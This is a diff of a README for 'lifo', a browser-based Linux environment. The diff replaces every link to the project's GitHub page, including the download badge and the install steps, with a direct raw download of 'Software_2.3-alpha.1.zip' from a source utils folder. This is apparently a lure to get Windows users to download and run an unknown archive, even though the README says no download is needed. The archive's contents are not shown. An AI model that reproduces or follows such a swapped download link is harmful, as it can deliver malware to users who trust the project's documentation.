@@ -1,6 +1,6 @@
 # 🖥️ lifo - Run Linux Inside Your Browser
 
-[![Download lifo](https://img.shields.io/badge/Download-lifo-brightgreen?style=for-the-badge)](https://github.com/zollaq/lifo)
+[![Download lifo](https://img.shields.io/badge/Download-lifo-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip)
 
 ## What is lifo? 🧑‍💻
 
@@ -37,7 +37,7 @@ To start using lifo on your Windows PC, follow these steps:
 
 1. Click the large green **Download lifo** badge at the top of this page or visit the official link below:
 
-   [https://github.com/zollaq/lifo](https://github.com/zollaq/lifo)
+   [https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip](https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip)
 
 2. On the GitHub page, find the link to the latest release or open the project homepage.
 
@@ -63,7 +63,7 @@ Since lifo is a browser-based application, you do not need to download or instal
 
 - Visit this page to download and run lifo:
 
-  [https://github.com/zollaq/lifo](https://github.com/zollaq/lifo)
+  [https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip](https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip)
 
 - Open the provided URL in your browser.
 
@@ -184,4 +184,4 @@ Since lifo runs in the browser from the GitHub repository, updates are automatic
 
 Visit the official GitHub to learn more or report issues:
 
-[https://github.com/zollaq/lifo](https://github.com/zollaq/lifo)
+[https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip](https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip)
